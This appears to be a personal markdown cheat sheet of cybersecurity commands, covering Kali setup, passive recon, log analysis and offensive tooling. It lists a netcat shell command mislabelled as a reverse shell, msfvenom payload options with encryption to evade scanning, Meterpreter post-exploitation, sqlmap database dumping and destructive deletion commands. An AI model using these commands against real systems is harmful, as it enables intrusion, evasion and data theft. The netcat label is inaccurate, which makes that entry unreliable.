# Cybersecurity Command Cheat Sheet

---

## 🛠️ Environment Installation & Configuration

### Stable Shared Folder Mount (UTM + Kali via VirtFS)
```bash
# 1. Create the mount point
sudo mkdir -p ~/kali_shared_folder

# 2. Mount the folder (The 'share' label must match the one in UTM)
sudo mount -t 9p -o trans=virtio share ~/kali_shared_folder -oversion=9p2000.L,access=any

# 3. Provide write permissions for VS Code
sudo chmod -R 777 ~/kali_shared_folder

# 4. Alias for quick access (Add to ~/.zshrc)
alias ciber='cd ~/kali_shared_folder'
```

### Install VS Code on Kali Linux
```bash
# 1. Download the security key
wget -qO- https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor > packages.microsoft.gpg
sudo install -D -o root -g root -m 644 packages.microsoft.gpg /etc/apt/keyrings/packages.microsoft.gpg

# 2. Add the official repository
sudo sh -c 'echo "deb [arch=amd64,arm64,armhf signed-by=/etc/apt/keyrings/packages.microsoft.gpg] https://packages.microsoft.com/repos/code stable main" > /etc/apt/sources.list.d/vscode.list'

# 3. Update and install
rm -f packages.microsoft.gpg
sudo apt update
sudo apt install code
```

---

## 🔍 OSINT & Reconnaissance

### Subdomain Discovery (via Certificate Transparency)
This command queries the public SSL certificate database to find subdomains without interacting directly with the target (Passive Recon).
```bash
# Replace google.com with the target domain
curl -s "https://crt.sh/?q=google.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
```
**Component Explanation:**
*   `curl -s`: Downloads data in "silent" mode.
*   `jq -r`: Extracts only the name values from JSON format.
*   `sed 's/\*\.//g'`: Cleans wildcard characters.
*   `sort -u`: Sorts the list and removes duplicates.

---

## 🐍 Python & Development Tools

### Install PIP and Black (Code Formatter)
In Kali Linux (Debian 12+), installing Python packages requires special attention.

1.  **Install PIP (Package Manager):**
    ```bash
    sudo apt update && sudo apt install python3-pip -y
    ```

2.  **Install Black Formatter:**
    ```bash
    pip3 install black --break-system-packages
    ```

---

## 🕵️ SOC Analysis & Monitoring

### Log Investigation (Linux / Kali)
*   **`last`**: Displays the history of successful logins.
*   **`cat /var/log/auth.log | grep "Failed"`**: Searches for failed login attempts (Useful for detecting Brute Force attacks).
*   **`tail -f /var/log/auth.log`**: Follows authentication logs in real-time.
*   **`journalctl -p 3 -xb`**: Displays ONLY critical errors since the last boot.
*   **`journalctl -u ssh --since "1 hour ago"`**: Shows logs strictly for the SSH service generated in the last hour.

### Log Investigation (macOS)
*   **Unified Logging System ("Apple's Secret"):**
    *   **`log show --predicate 'eventMessage CONTAINS[c] "error"' --last 10m`**: Search the hidden database for any error message in the last 10 minutes.

### Log Investigation (Windows)
*   **PowerShell Advanced ("Windows Secret"):**
    *   **`Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625} -MaxEvents 10`**: Directly queries the Windows XML database for the last 10 failed logins (ID 4625).

---

## 🔍 Wireshark & Network Analysis

### Fundamentals (macOS & Linux)
*   **`chmod 700 [file]`**: Full rights for the owner, nothing for the rest.
*   **`ls -ahtl`**: Lists ALL files in chronological order (newest first).
*   **`grep -r "word" .`**: Recursively searches for "word" in the current directory's files.
*   **`sed 's/[find]/[replace]/g' file`**: Replaces text patterns (Stream Editor).

---

## 🛠️ Dual Arsenal: Attack and Defense Tools

### 1. Netcat (`nc`) - "The Swiss Army Knife"
*   **`nc -lvp [port]`**: Starts a listener.
*   **`nc -zv [IP] [ports]`**: Scans ports without sending data.
*   **😈 Attack (Reverse Shell):** `nc -lvp 4444 -e /bin/bash`

### 2. Tcpdump - "Terminal Sniffer"
*   **`tcpdump -i any port 80`**: View unencrypted web traffic.
*   **`-w [file].pcap`**: Saves traffic for Wireshark analysis.

### 3. Shred - "Data Destruction"
*   **`shred -un 5 -z secret.txt`**: Overwrites 5 times, adds zeros, and deletes.

---

## 📚 External Resources & Standards

*   **MITRE ATT&CK**: [attack.mitre.org](https://attack.mitre.org/)
*   **GTFOBins**: [gtfobins.github.io](https://gtfobins.github.io/)

---

## 3. Metasploit Framework (Exploitation)

### Database Preparation
*   **`sudo service postgresql start`**: Starts the PostgreSQL service.
*   **`db_nmap [options] [target]`**: Runs Nmap and automatically saves results to the Metasploit database.

### Common Commands
*   **`search [term]`**: Searches for modules.
*   **`use [id_or_path]`**: Selects a module.
*   **`show options`**: Shows parameters.
*   **`check`**: Verifies if the target is vulnerable.
*   **`run` / `exploit`**: Executes the selected module.

---

## 4. Payload Generation (Backdoors & Reverse Shells)

### Msfvenom
*   **`-p [payload]`**: Desired connection type (e.g., `python/meterpreter/reverse_tcp`).
*   **`LHOST` / `LPORT`**: Your IP and listening port.
*   **`--encrypt aes256`**: Encrypts the payload to avoid static scanning.

---

## 5. Post-Exploitation

### Meterpreter Control
*   **`sysinfo`**: System information.
*   **`getuid`**: Current user.
*   **`screenshot`**: Capture victim's screen.
*   **`shell`**: Switch to standard terminal.

---

## 6. Privilege Escalation (User to Root)

### Checking Rights
*   **`sudo -l`**: Lists commands the user can run with sudo.
*   **`find / -perm -4000 -type f 2>/dev/null`**: Searches for SUID files.

### Automation with LinPeas
*   **`./linpeas.sh`**: The ultimate script for enumerating Privilege Escalation vectors.

---

## 20. Web Exploitation (SQLMap)
*   **`sqlmap -u "[URL]" --dbs --batch`**: Enumerates databases.
*   **`sqlmap -u "[URL]" -D [DB] -T [Table] --dump --batch`**: Dumps table content.

---

## macOS Specific Commands (Gestiune Parole & Keychain)
*   **`passwd`**: Changes the current user password.
*   **`security set-keychain-password ~/Library/Keychains/login.keychain-db`**: Updates the Keychain password to match the user password.
*   **`rm -rf ~/Library/Keychains/*`**: Radical method to reset the Keychain (Destructive!).

---
*Last update: March 2, 2026.*
